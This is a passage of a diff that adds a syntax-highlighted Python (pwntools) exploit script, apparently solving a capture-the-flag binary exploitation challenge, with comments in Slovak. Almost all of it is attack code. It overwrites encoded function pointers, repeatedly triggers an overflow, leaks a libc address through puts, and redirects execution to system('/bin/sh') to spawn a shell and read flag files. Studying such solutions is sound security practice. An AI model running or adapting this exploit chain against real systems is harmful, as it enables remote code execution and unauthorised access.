+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x41</span><span class="sh">"</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+                <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+                <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span>
+                <span class="nf">win_lot</span><span class="p">()</span>
+                <span class="nf">draw_lot</span><span class="p">(</span><span class="n">com</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+                <span class="nf">write_lot</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+            <span class="c1"># call do guess_number() invoke overflow
+</span>            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">vyhravame</span><span class="sh">"</span><span class="p">)</span>
+            <span class="n">guess_number</span> <span class="o">=</span> <span class="mh">0x4015AA</span>  <span class="c1"># create
+</span>            <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span>
+            <span class="nf">win_lot</span><span class="p">()</span>
+            <span class="nf">draw_lot</span><span class="p">(</span><span class="n">com</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+            <span class="nf">write_lot</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="nf">rol</span><span class="p">((</span><span class="n">guess_number</span> <span class="o">^</span> <span class="n">key</span><span class="p">),</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">)))</span>
+
+            <span class="c1"># write exit function-&gt;type
+</span>            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
+                <span class="n">fnc_type</span> <span class="o">=</span> <span class="mi">4</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fnc_type</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x41</span><span class="sh">"</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+                <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+                <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">10</span><span class="p">)</span>
+                <span class="nf">win_lot</span><span class="p">()</span>
+                <span class="nf">draw_lot</span><span class="p">(</span><span class="n">com</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+                <span class="nf">write_lot</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+            <span class="c1"># call do check_number()
+</span>            <span class="n">check</span> <span class="o">=</span> <span class="mh">0x40165C</span>  <span class="c1"># check
+</span>            <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">11</span><span class="p">)</span>
+            <span class="nf">win_lot</span><span class="p">()</span>
+            <span class="nf">draw_lot</span><span class="p">(</span><span class="n">com</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+            <span class="nf">write_lot</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="nf">rol</span><span class="p">((</span><span class="n">check</span> <span class="o">^</span> <span class="n">key</span><span class="p">),</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">)))</span>
+
+            <span class="c1"># write exit function-&gt;type
+</span>            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
+                <span class="n">fnc_type</span> <span class="o">=</span> <span class="mi">4</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fnc_type</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x41</span><span class="sh">"</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+                <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+                <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">14</span><span class="p">)</span>
+                <span class="nf">win_lot</span><span class="p">()</span>
+                <span class="nf">draw_lot</span><span class="p">(</span><span class="n">com</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+                <span class="nf">write_lot</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+            <span class="c1"># call do guess_number()
+</span>            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">vyhravame</span><span class="sh">"</span><span class="p">)</span>
+            <span class="n">guess_number</span> <span class="o">=</span> <span class="mh">0x4015AA</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">15</span><span class="p">)</span>
+            <span class="nf">win_lot</span><span class="p">()</span>
+            <span class="nf">draw_lot</span><span class="p">(</span><span class="n">com</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+            <span class="nf">write_lot</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="nf">rol</span><span class="p">((</span><span class="n">guess_number</span> <span class="o">^</span> <span class="n">key</span><span class="p">),</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">)))</span>
+
+            <span class="c1"># write exit function-&gt;type
+</span>            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
+                <span class="n">fnc_type</span> <span class="o">=</span> <span class="mi">4</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fnc_type</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x41</span><span class="sh">"</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+                <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+                <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">18</span><span class="p">)</span>
+                <span class="nf">win_lot</span><span class="p">()</span>
+                <span class="nf">draw_lot</span><span class="p">(</span><span class="n">com</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+                <span class="nf">write_lot</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+            <span class="c1"># call do check_number
+</span>            <span class="n">check_number</span> <span class="o">=</span> <span class="mh">0x40165C</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">19</span><span class="p">)</span>
+            <span class="nf">win_lot</span><span class="p">()</span>
+            <span class="nf">draw_lot</span><span class="p">(</span><span class="n">com</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+            <span class="nf">write_lot</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="nf">rol</span><span class="p">((</span><span class="n">check_number</span> <span class="o">^</span> <span class="n">key</span><span class="p">),</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">)))</span>
+
+            <span class="c1"># write exit function-&gt;type
+</span>            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
+                <span class="n">puts_got</span> <span class="o">=</span> <span class="mi">4</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x41</span><span class="sh">"</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+                <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+                <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">22</span><span class="p">)</span>
+                <span class="nf">win_lot</span><span class="p">()</span>
+                <span class="nf">draw_lot</span><span class="p">(</span><span class="n">com</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+                <span class="nf">write_lot</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+            <span class="c1"># call do guess_number() overflow
+</span>            <span class="n">guess_number</span> <span class="o">=</span> <span class="mh">0x4015AA</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">23</span><span class="p">)</span>
+            <span class="nf">win_lot</span><span class="p">()</span>
+            <span class="nf">draw_lot</span><span class="p">(</span><span class="n">com</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+            <span class="nf">write_lot</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="nf">rol</span><span class="p">((</span><span class="n">guess_number</span> <span class="o">^</span> <span class="n">key</span><span class="p">),</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">)))</span>
+
+            <span class="c1">#
+</span>            <span class="c1"># write exit function-&gt;type
+</span>            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
+                <span class="n">fnc_type</span> <span class="o">=</span> <span class="mi">4</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fnc_type</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x41</span><span class="sh">"</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+                <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+                <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">26</span><span class="p">)</span>
+                <span class="nf">win_lot</span><span class="p">()</span>
+                <span class="nf">draw_lot</span><span class="p">(</span><span class="n">com</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+                <span class="nf">write_lot</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+            <span class="c1"># call do check_number
+</span>            <span class="n">check_number</span> <span class="o">=</span> <span class="mh">0x40165C</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">27</span><span class="p">)</span>
+            <span class="nf">win_lot</span><span class="p">()</span>
+            <span class="nf">draw_lot</span><span class="p">(</span><span class="n">com</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+            <span class="nf">write_lot</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="nf">rol</span><span class="p">((</span><span class="n">check_number</span> <span class="o">^</span> <span class="n">key</span><span class="p">),</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">)))</span>
+
+            <span class="c1">## leak libc usign puts@plt(puts@got)
+</span>
+            <span class="c1"># write exit function-&gt;type
+</span>            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
+                <span class="n">fnc_type</span> <span class="o">=</span> <span class="mi">4</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fnc_type</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x41</span><span class="sh">"</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+                <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+                <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">34</span><span class="p">)</span>
+                <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[!!!!!!]</span><span class="sh">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+                <span class="nf">win_lot</span><span class="p">()</span>
+                <span class="nf">draw_lot</span><span class="p">(</span><span class="n">com</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+                <span class="nf">write_lot</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+            <span class="c1"># leak libc
+</span>            <span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x40135B</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">35</span><span class="p">)</span>
+            <span class="nf">win_lot</span><span class="p">()</span>
+            <span class="nf">draw_lot</span><span class="p">(</span><span class="n">com</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+            <span class="nf">write_lot</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="nf">rol</span><span class="p">((</span><span class="n">puts_plt</span> <span class="o">^</span> <span class="n">key</span><span class="p">),</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">)))</span>
+
+            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">6</span><span class="p">):</span>
+
+                <span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x403FA0</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x41</span><span class="sh">"</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+                <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+                <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">36</span><span class="p">)</span>
+                <span class="nf">win_lot</span><span class="p">()</span>
+                <span class="nf">draw_lot</span><span class="p">(</span><span class="n">com</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+                <span class="nf">write_lot</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">exitujeme</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">win_lot</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+        <span class="nf">win_lot</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+        <span class="nf">win_lot</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+        <span class="nf">win_lot</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+        <span class="nf">win_lot</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+        <span class="nf">sl</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+        <span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">bye~</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">leak</span> <span class="o">=</span> <span class="nf">upad</span><span class="p">(</span><span class="nf">rcv</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
+        <span class="nf">lhex</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="sh">"</span><span class="s">leak</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x19ECB0</span>
+
+        <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span>
+        <span class="nf">sa</span><span class="p">(</span><span class="sh">"</span><span class="s">please : </span><span class="sh">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+        <span class="nf">sla</span><span class="p">(</span><span class="sh">"</span><span class="s">index : </span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">sa</span><span class="p">(</span><span class="sh">"</span><span class="s">number : </span><span class="sh">"</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="nf">rol</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">)))</span>
+
+        <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span>
+        <span class="nf">sa</span><span class="p">(</span><span class="sh">"</span><span class="s">please : </span><span class="sh">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+        <span class="nf">sla</span><span class="p">(</span><span class="sh">"</span><span class="s">index : </span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">puts_got</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="p">))</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x41</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span>
+
+        <span class="nf">sa</span><span class="p">(</span><span class="sh">"</span><span class="s">number : </span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span>
+        <span class="nf">sa</span><span class="p">(</span><span class="sh">"</span><span class="s">please : </span><span class="sh">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+        <span class="nf">sla</span><span class="p">(</span><span class="sh">"</span><span class="s">index : </span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">puts_got</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="p">))</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x41</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span>
+        <span class="nf">sa</span><span class="p">(</span><span class="sh">"</span><span class="s">number : </span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">!!!!!!!!!!!!VYHRALI SME PRVU CAST</span><span class="sh">"</span><span class="p">)</span>
+
+        <span class="nf">sl</span><span class="p">(</span><span class="sh">"</span><span class="s">cat flag.txt</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">sl</span><span class="p">(</span><span class="sh">"</span><span class="s">cat /home/prob/flag.txt</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">sl</span><span class="p">(</span><span class="sh">"</span><span class="s">cat /flag.txt</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">sl</span><span class="p">(</span><span class="sh">"</span><span class="s">cat /flag</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="nf">ra</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span>
+        <span class="k">break</span>
+    <span class="k">except</span> <span class="nb">EOFError</span> <span class="k">as</span> <span class="n">ea</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">jetopici</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">end_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
+        <span class="n">elapsed_time</span> <span class="o">=</span> <span class="n">end_time</span> <span class="o">-</span> <span class="n">start_time</span>
